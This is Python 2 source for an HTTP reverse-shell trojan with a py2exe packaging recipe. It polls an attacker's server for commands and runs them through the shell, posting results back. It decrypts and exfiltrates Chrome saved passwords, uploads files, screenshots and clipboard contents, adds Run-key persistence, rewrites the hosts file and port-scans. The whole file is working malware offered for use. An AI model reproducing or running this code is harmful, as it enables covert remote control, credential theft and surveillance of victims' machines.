#!/usr/bin/env python
# -*- coding: utf-8 -*-


"""
# py2exe download link: http://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/

setup.py:

from distutils.core import setup
import py2exe , sys, os

sys.argv.append("py2exe")
setup(
    options = {'py2exe': {'bundle_files': 1}},
 
    windows = [{'script': "HTTP_Client_Reverse_Shell.py"}],    
    zipfile = None,
    
)
"""

#------------------------------------------------------------------------------
# Modules
#------------------------------------------------------------------------------

import socket
import subprocess
import os
import sys
import argparse
import hashlib
import requests
import time
import shutil
import tempfile
import platform
from os import getenv
import sqlite3
from shutil import copyfile
import pyperclip
if (any(platform.win32_ver())):
    import win32crypt
    import _winreg as wreg
    from PIL import ImageGrab

#------------------------------------------------------------------------------
# Python version check.
#------------------------------------------------------------------------------

if __name__ == "__main__":
    if sys.version_info < (2, 7) or sys.version_info >= (3, 0):
        show_banner()
        print ("[!] You must use Python version 2.7 or above")
        sys.exit(1)

#------------------------------------------------------------------------------
# Command line parser using argparse
#------------------------------------------------------------------------------

def cmdline_parser():
    parser = argparse.ArgumentParser(conflict_handler='resolve', add_help=True, description='Example: python %(prog)s -i 1.2.3.4 -p 80', version='TCPRS 0.1',
             usage="python %(prog)s [OPTIONS]")

    parser.add_argument('-i', '--ip', action='store', dest='ip', help='IP')
    parser.add_argument('-d', '--domain', action='store', dest='domain', help='Domain')
    parser.add_argument('-p', '--port', action='store', dest='port', help='Port')
    return parser

#------------------------------------------------------------------------------
# Functions
#------------------------------------------------------------------------------

def persistence():
    path = os.getcwd().strip('/n')
    Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')
    destination = userprof.strip('\n\r') + '\\Documents\\'  +'persistence.exe'

    if not os.path.exists(destination):
        shutil.copyfile(path+'\persistence.exe', destination)
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,
                             wreg.KEY_ALL_ACCESS)
        wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,destination)
        key.Close()


def dns_host(host,ip):
    os.chdir("C:\Windows\System32\drivers\etc")
    command = "echo " + ip + " " + host + " >> hosts"
    print command
    CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    command = "ipconfig /flushdns"
    CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)



def Chrome(connectionhttpserver):
    path = getenv("LOCALAPPDATA")  + "\Google\Chrome\User Data\Default\Login Data"
    pathcopy = getenv("LOCALAPPDATA")  + "\Google\Chrome\User Data\Default\LoginDataCopy"
    copyfile(path, pathcopy)
    connectionSQLite = sqlite3.connect(pathcopy)
    cursor = connectionSQLite.cursor() 
    cursor.execute('SELECT action_url, username_value, password_value FROM logins') 
    for raw in cursor.fetchall():
        password = win32crypt.CryptUnprotectData(raw[2])[1]
        requests.post(url=connectionhttpserver, data=password)
       
    connectionSQLite.close()

def scanner(socketconnection,ip,ports):
    
    scan_result = ''

    # Ports format 21,22,23,80,443
    for port in ports.split(','):
        
        # for each port a connection using socket library 
        try:
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # returns 0: port opened 
            output = sock.connect_ex((ip, int(port) ))              
            if output == 0:
                sock.send('Test \n')
                banner = sock.recv(1024)
                scan_result = scan_result + "[+] Port " + port + " is opened " + banner + "\n"
            else:
                scan_result = scan_result + "[-] Port " + port + " is closed or Host is not reachable" + "\n"
                
            sock.close()
    
        except Exception, e:
            pass

    # Send the results
    requests.post(url=socketconnection, data=scan_result)



def connect(IPconnection,Portconnection):
    if (Portconnection != "80"):
        connection = "http://" + IPconnection + ":" + Portconnection
    else:
        connection = "http://" + IPconnection
 
    while True:
        
        requestcmd = requests.get(connection)
        command = requestcmd.text
            
        if 'terminate' in command:
            break
            
        elif 'help' in command:
            helpcmd = '''
            terminate
            search C:\\*.pdf
            screencap
            persistence (in progress)
            scan <IP>:22,80
            get filepath
            clipboard
            chrome
            dns_host <domain> <IP>
            '''
            requests.post(url=connection, data=helpcmd)

        elif 'search' in command:  
            command = command[7:]
            
            path,ext=command.split('*')  
            list = ''
            for dirpath, dirname, files in os.walk(path):
                for file in files:
                    if file.endswith(ext):
                        list = list + '\n' + os.path.join(dirpath, file)
                        
            requests.post(url=connection, data= list)


        elif 'chrome' in command:
            Chrome(connection)


        elif 'dns_host' in command:
            commanddns,host,ip=command.split(' ')
            dns_host(host,ip)


        elif 'screencap' in command:
            
            dirpath = tempfile.mkdtemp()
            ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")
            url = connection +'/storejpg'                   
            files = {'file': open(dirpath + "\img.jpg", 'rb')}
            r = requests.post(url, files=files)
            
            files['file'].close()
            shutil.rmtree(dirpath)

        elif 'scan' in command:
            command = command[5:]
            ip,ports = command.split(':')
            scanner(connection,ip,ports)

        elif 'persistence' in command:
            persistence()

        elif 'clipboard' in command:
            list = []
            
            if pyperclip.paste() != 'None':
                value = pyperclip.paste()

                if value not in list:
                    list.append(value)
                r = requests.post(url=connection, data=str(list))
            else:
                post_response = requests.post(url=connection, data='[-] No data in the clipboard!' )

        elif 'get' in command:
            
            grab,path=command.split(' ')
            if os.path.exists(path):
                fileext = os.path.basename(path)
                url = connection+'/filename'
                r = requests.post(url, data=fileext)

                url = connection+'/store' 
                files = {'file': open(path, 'rb')} 
                r = requests.post(url, files=files) 
            else:
                post_response = requests.post(url=connection, data='[-] Not able to find the file !' )
                
        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            post_response = requests.post(url=connection, data=CMD.stdout.read() )
            post_response = requests.post(url=connection, data=CMD.stderr.read() )

        time.sleep(2)

#------------------------------------------------------------------------------
# Start of program
#------------------------------------------------------------------------------

def main():

    # Get the command line parser.
    parser = cmdline_parser()

    # Show help if no args
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

	# Get results line parser.
    results = parser.parse_args()

    print "[+] HTTP Client connected to " + results.ip + " and port " + results.port

    if (results.ip):
        ipconnect = results.ip
    elif (result.domain):
        ipconnect =  socket.gethostbyname(results.domain)
    else:
        print "[-] A domain or IP is needed "

    connect(ipconnect, results.port)

#------------------------------------------------------------------------------
# Main
#------------------------------------------------------------------------------

if __name__ == '__main__':
	main()